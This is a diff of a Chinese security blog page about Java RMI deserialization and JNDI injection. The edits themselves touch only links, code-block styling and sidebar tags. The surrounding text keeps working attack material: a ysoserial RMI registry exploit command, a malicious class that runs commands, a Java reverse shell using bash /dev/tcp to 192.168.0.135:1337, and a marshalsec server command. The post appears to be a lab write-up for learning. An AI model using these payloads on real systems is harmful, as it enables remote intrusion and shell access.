@@ -393,7 +393,7 @@
 <p>远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。</p>
 <p>RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。</p>
 <p>任何可以被远程调用方法的对象必须实现 java.rmi.Remote 接口，远程对象的实现类必须继承UnicastRemoteObject类(或者手工初始化远程对象，详见参考链接)</p>
-<p>RMI的远程调用逻辑如下图（摘自参考链接）</p>
+<p>RMI的远程调用逻辑如下图（摘自参考链接<a href="https://www.freebuf.com/column/189835.html）" target="_blank" rel="noopener">https://www.freebuf.com/column/189835.html）</a></p>
 <p><img src="1.png" alt="automne"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. Server端监听一个端口，这个端口是JVM随机选择的；</span><br><span class="line">2. Client端并不知道Server远程对象的通信地址和端口，但是Stub中包含了这些信息，并封装了底层网络操作；</span><br><span class="line">3. Client端可以调用Stub上的方法；</span><br><span class="line">4. Stub连接到Server端监听的通信端口并提交参数；</span><br><span class="line">5. 远程Server端上执行具体的方法，并返回结果给Stub；</span><br><span class="line">6. Stub返回执行结果给Client端，从Client看来就好像是Stub在本地执行了这个方法一样</span><br></pre></td></tr></table></figure>
 <p>JDK提供了RMI注册表来获取Stub，现在的调用关系如下图</p>
@@ -428,7 +428,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-30099844c6-1.jar ysoserial.exploit.RMIRegistryExploit 192.168.0.135 1337 CommonsCollections1 calc.exe</span><br></pre></td></tr></table></figure>
 <p>在ysoserial-master-30099844c6-1.jar所在的目录下执行上面的命令，成功触发命令执行</p>
 <p><img src="7.png" alt="automne"></p>
-<h2 id="二、JNDI注入"><a href="#二、JNDI注入" class="headerlink" title="二、JNDI注入"></a>二、JNDI注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。JNDI注入也利用了动态类的方法。</span><br></pre></td></tr></table></figure>
+<h2 id="二、JNDI注入"><a href="#二、JNDI注入" class="headerlink" title="二、JNDI注入"></a>二、JNDI注入</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。JNDI注入也利用了动态类的方法。</span><br></pre></td></tr></table></figure>
 <p>JNDI (Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口。JNDI支持的服务主要有以下几种：DNS、LDAP、 CORBA对象服务、RMI等。</p>
 <p>如果远程获取RMI服务上的对象为Reference类或其子类，则在客户端获取到远程对象存根实例时，可以<code>从其他服务器上加载class文件</code>进行实例化，常用的代码形式：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"ClassName"</span>, <span class="string">"ClassFactory"</span>, <span class="string">"http://example.com:12345/"</span>);</span><br><span class="line">ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br></pre></td></tr></table></figure>
@@ -444,7 +444,7 @@
 <p>EvilObject.java</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>然后用JDK 7u80将EvilObject.java编译为EvilObject.class</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意在在JDK 6u132, JDK 7u122, JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意在在JDK 6u132, JDK 7u122, JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。</span><br></pre></td></tr></table></figure>
 <p>然后在该目录下开启8000端口作为web服务器</p>
 <p>依次在IDEA里运行RMIServer、JNDIClient</p>
 <p>可以看到触发了命令执行</p>
@@ -475,7 +475,7 @@
 <p>接下来测试反弹shell</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReverseShell</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"bash -i &gt;&amp; /dev/tcp/192.168.0.135/1337 0&gt;&amp;1"</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>然后就是开启rmi服务器</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\Learning\Java&gt;D:\ApplicationTools\Java\jdk1.8.0_231\bin\java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.0.135/#ReverseShell&quot; 7777</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\Learning\Java&gt;D:\ApplicationTools\Java\jdk1.8.0_231\bin\java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.0.135/#ReverseShell" 7777</span><br></pre></td></tr></table></figure>
 <p>burpsute发送payload</p>
 <p><img src="13.png" alt="automne"></p>
 <p>此时本地监听的nc已经有了响应</p>
@@ -625,6 +625,18 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -1479,21 +1491,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="z3"><span class="iconfont-archer">&#xe606;</span>z3</span>
     
-        <span class="sidebar-tag-name" data-tags="sha-1"><span class="iconfont-archer">&#xe606;</span>sha-1</span>
-    
-        <span class="sidebar-tag-name" data-tags="reverse"><span class="iconfont-archer">&#xe606;</span>reverse</span>
-    
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
-        <span class="sidebar-tag-name" data-tags="sqli"><span class="iconfont-archer">&#xe606;</span>sqli</span>
-    
-        <span class="sidebar-tag-name" data-tags="sqlite"><span class="iconfont-archer">&#xe606;</span>sqlite</span>
-    
-        <span class="sidebar-tag-name" data-tags="fat"><span class="iconfont-archer">&#xe606;</span>fat</span>
-    
-        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
-    
-        <span class="sidebar-tag-name" data-tags="broadcastreceiver"><span class="iconfont-archer">&#xe606;</span>broadcastreceiver</span>
+        <span class="sidebar-tag-name" data-tags="reverse"><span class="iconfont-archer">&#xe606;</span>reverse</span>
     
         <span class="sidebar-tag-name" data-tags="luks"><span class="iconfont-archer">&#xe606;</span>luks</span>
     
@@ -1501,25 +1501,57 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="photorec"><span class="iconfont-archer">&#xe606;</span>photorec</span>
     
+        <span class="sidebar-tag-name" data-tags="fat"><span class="iconfont-archer">&#xe606;</span>fat</span>
+    
+        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
+    
+        <span class="sidebar-tag-name" data-tags="sqli"><span class="iconfont-archer">&#xe606;</span>sqli</span>
+    
+        <span class="sidebar-tag-name" data-tags="sqlite"><span class="iconfont-archer">&#xe606;</span>sqlite</span>
+    
+        <span class="sidebar-tag-name" data-tags="broadcastreceiver"><span class="iconfont-archer">&#xe606;</span>broadcastreceiver</span>
+    
         <span class="sidebar-tag-name" data-tags="cbc"><span class="iconfont-archer">&#xe606;</span>cbc</span>
     
         <span class="sidebar-tag-name" data-tags="MAC"><span class="iconfont-archer">&#xe606;</span>MAC</span>
     
-        <span class="sidebar-tag-name" data-tags="golang"><span class="iconfont-archer">&#xe606;</span>golang</span>
-    
-        <span class="sidebar-tag-name" data-tags="race condition"><span class="iconfont-archer">&#xe606;</span>race condition</span>
+        <span class="sidebar-tag-name" data-tags="padding oracle"><span class="iconfont-archer">&#xe606;</span>padding oracle</span>
     
         <span class="sidebar-tag-name" data-tags="sso"><span class="iconfont-archer">&#xe606;</span>sso</span>
     
         <span class="sidebar-tag-name" data-tags="oauth 2.0"><span class="iconfont-archer">&#xe606;</span>oauth 2.0</span>
     
+        <span class="sidebar-tag-name" data-tags="pwntools"><span class="iconfont-archer">&#xe606;</span>pwntools</span>
+    
+        <span class="sidebar-tag-name" data-tags="golang"><span class="iconfont-archer">&#xe606;</span>golang</span>
+    
+        <span class="sidebar-tag-name" data-tags="race condition"><span class="iconfont-archer">&#xe606;</span>race condition</span>
+    
+        <span class="sidebar-tag-name" data-tags="sha-1"><span class="iconfont-archer">&#xe606;</span>sha-1</span>
+    
         <span class="sidebar-tag-name" data-tags="ecb"><span class="iconfont-archer">&#xe606;</span>ecb</span>
     
         <span class="sidebar-tag-name" data-tags="socat"><span class="iconfont-archer">&#xe606;</span>socat</span>
     
-        <span class="sidebar-tag-name" data-tags="pwntools"><span class="iconfont-archer">&#xe606;</span>pwntools</span>
+        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
         <span class="sidebar-tag-name" data-tags="volatility"><span class="iconfont-archer">&#xe606;</span>volatility</span>
+    
+        <span class="sidebar-tag-name" data-tags="yara plugin"><span class="iconfont-archer">&#xe606;</span>yara plugin</span>
+    
+        <span class="sidebar-tag-name" data-tags="malware"><span class="iconfont-archer">&#xe606;</span>malware</span>
+    
+        <span class="sidebar-tag-name" data-tags="codereflect"><span class="iconfont-archer">&#xe606;</span>codereflect</span>
+    
+        <span class="sidebar-tag-name" data-tags="gmpy2"><span class="iconfont-archer">&#xe606;</span>gmpy2</span>
+    
+        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
+    
+        <span class="sidebar-tag-name" data-tags="binary"><span class="iconfont-archer">&#xe606;</span>binary</span>
+    
+        <span class="sidebar-tag-name" data-tags="javascript prototype pollution"><span class="iconfont-archer">&#xe606;</span>javascript prototype pollution</span>
+    
+        <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
     
         <span class="sidebar-tag-name" data-tags="inet_aton"><span class="iconfont-archer">&#xe606;</span>inet_aton</span>
     
@@ -1533,17 +1565,15 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="sourceleakhacker"><span class="iconfont-archer">&#xe606;</span>sourceleakhacker</span>
     
-        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
+        <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
     
-        <span class="sidebar-tag-name" data-tags="malware"><span class="iconfont-archer">&#xe606;</span>malware</span>
+        <span class="sidebar-tag-name" data-tags="ssti"><span class="iconfont-archer">&#xe606;</span>ssti</span>
     
-        <span class="sidebar-tag-name" data-tags="codereflect"><span class="iconfont-archer">&#xe606;</span>codereflect</span>
+        <span class="sidebar-tag-name" data-tags="ecc"><span class="iconfont-archer">&#xe606;</span>ecc</span>
     
-        <span class="sidebar-tag-name" data-tags="yara plugin"><span class="iconfont-archer">&#xe606;</span>yara plugin</span>
+        <span class="sidebar-tag-name" data-tags="AES"><span class="iconfont-archer">&#xe606;</span>AES</span>
     
-        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
-    
-        <span class="sidebar-tag-name" data-tags="binary"><span class="iconfont-archer">&#xe606;</span>binary</span>
+        <span class="sidebar-tag-name" data-tags="tshark"><span class="iconfont-archer">&#xe606;</span>tshark</span>
     
         <span class="sidebar-tag-name" data-tags="primefac"><span class="iconfont-archer">&#xe606;</span>primefac</span>
     
@@ -1551,27 +1581,17 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="ssl"><span class="iconfont-archer">&#xe606;</span>ssl</span>
     
-        <span class="sidebar-tag-name" data-tags="AES"><span class="iconfont-archer">&#xe606;</span>AES</span>
-    
-        <span class="sidebar-tag-name" data-tags="tshark"><span class="iconfont-archer">&#xe606;</span>tshark</span>
-    
-        <span class="sidebar-tag-name" data-tags="javascript prototype pollution"><span class="iconfont-archer">&#xe606;</span>javascript prototype pollution</span>
-    
-        <span class="sidebar-tag-name" data-tags="nodejs"><span class="iconfont-archer">&#xe606;</span>nodejs</span>
-    
-        <span class="sidebar-tag-name" data-tags="gmpy2"><span class="iconfont-archer">&#xe606;</span>gmpy2</span>
-    
-        <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
-    
-        <span class="sidebar-tag-name" data-tags="ssti"><span class="iconfont-archer">&#xe606;</span>ssti</span>
-    
-        <span class="sidebar-tag-name" data-tags="ecc"><span class="iconfont-archer">&#xe606;</span>ecc</span>
-    
         <span class="sidebar-tag-name" data-tags="RsaCtfTool"><span class="iconfont-archer">&#xe606;</span>RsaCtfTool</span>
     
         <span class="sidebar-tag-name" data-tags="Hex"><span class="iconfont-archer">&#xe606;</span>Hex</span>
     
-        <span class="sidebar-tag-name" data-tags="padding oracle"><span class="iconfont-archer">&#xe606;</span>padding oracle</span>
+        <span class="sidebar-tag-name" data-tags="nim game"><span class="iconfont-archer">&#xe606;</span>nim game</span>
+    
+        <span class="sidebar-tag-name" data-tags=".iso"><span class="iconfont-archer">&#xe606;</span>.iso</span>
+    
+        <span class="sidebar-tag-name" data-tags="gpg"><span class="iconfont-archer">&#xe606;</span>gpg</span>
+    
+        <span class="sidebar-tag-name" data-tags="outguess"><span class="iconfont-archer">&#xe606;</span>outguess</span>
     
         <span class="sidebar-tag-name" data-tags="sage"><span class="iconfont-archer">&#xe606;</span>sage</span>
     
@@ -1582,12 +1602,6 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="multi-primes"><span class="iconfont-archer">&#xe606;</span>multi-primes</span>
     
         <span class="sidebar-tag-name" data-tags="prng"><span class="iconfont-archer">&#xe606;</span>prng</span>
-    
-        <span class="sidebar-tag-name" data-tags=".iso"><span class="iconfont-archer">&#xe606;</span>.iso</span>
-    
-        <span class="sidebar-tag-name" data-tags="gpg"><span class="iconfont-archer">&#xe606;</span>gpg</span>
-    
-        <span class="sidebar-tag-name" data-tags="outguess"><span class="iconfont-archer">&#xe606;</span>outguess</span>
     
         <span class="sidebar-tag-name" data-tags="zsteg"><span class="iconfont-archer">&#xe606;</span>zsteg</span>
     
@@ -1602,8 +1616,6 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="weblogic"><span class="iconfont-archer">&#xe606;</span>weblogic</span>
     
         <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
-    
-        <span class="sidebar-tag-name" data-tags="nim game"><span class="iconfont-archer">&#xe606;</span>nim game</span>
     
         <span class="sidebar-tag-name" data-tags="deserialization"><span class="iconfont-archer">&#xe606;</span>deserialization</span>
     
@@ -1646,11 +1658,11 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="Crypto"><span class="iconfont-archer">&#xe60a;</span>Crypto</span>
     
+        <span class="sidebar-category-name" data-categories="Forensics"><span class="iconfont-archer">&#xe60a;</span>Forensics</span>
+    
         <span class="sidebar-category-name" data-categories="Android"><span class="iconfont-archer">&#xe60a;</span>Android</span>
     
         <span class="sidebar-category-name" data-categories="Web"><span class="iconfont-archer">&#xe60a;</span>Web</span>
-    
-        <span class="sidebar-category-name" data-categories="Forensics"><span class="iconfont-archer">&#xe60a;</span>Forensics</span>
     
         <span class="sidebar-category-name" data-categories="Misc"><span class="iconfont-archer">&#xe60a;</span>Misc</span>
     
